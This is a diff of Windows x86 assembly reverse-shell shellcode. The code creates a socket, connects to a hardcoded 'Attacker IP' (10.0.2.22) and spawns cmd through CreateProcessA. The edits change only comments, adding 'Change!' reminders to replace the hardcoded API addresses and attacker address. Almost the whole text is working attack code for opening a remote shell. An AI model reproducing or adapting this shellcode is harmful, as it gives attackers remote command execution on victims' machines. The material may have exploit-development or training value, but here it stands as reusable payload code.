@@ -10,12 +10,12 @@ inc ebx                 ; Type: SOCK_STREAM=1
 push ebx                ; Push 'type' parameter
 inc ebx                 ; Af: AF_INET=2
 push ebx                ; Push 'af' parameter
-mov ebx,0x771e9ba0      ; Address of WSASocketA() on WinXPSP3
+mov ebx,0x771e9ba0      ; Change! Address of WSASocketA()
 call ebx                ; Call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 
 ; connect()
-mov ebx,0x6B57555F      ; Attacker IP: 10.0.2.22. In reverse order:
+mov ebx,0x6B57555F      ; Change if needed! Attacker IP: 10.0.2.22. In reverse order:
                         ; hex(15) = 0x16
                         ; hex(2) = 0x02
                         ; hex(0) = 0x00
@@ -32,7 +32,7 @@ mov ebx,esp             ; EBX now has the pointer to sockaddr structure
 push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
 push ebx                ; Push pointer ('name' parameter)
 push esi                ; Push saved socket handler ('s' parameter)
-mov ebx,0x771e6980      ; Address of connect() on WinXPSP3
+mov ebx,0x771e6980      ; Change! Address of connect()
 call ebx                ; Call connect()
 
 ; CreateProcessA()
@@ -90,5 +90,5 @@ push ebx                ; lpThreadAttributes
 push ebx                ; lpProcessAttributes
 push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
 push ebx                ; lpApplicationName
-mov ebx,0x7594f960      ; Call CreateProcessA()
+mov ebx,0x7594f960      ; Change! Call CreateProcessA()
 call ebx
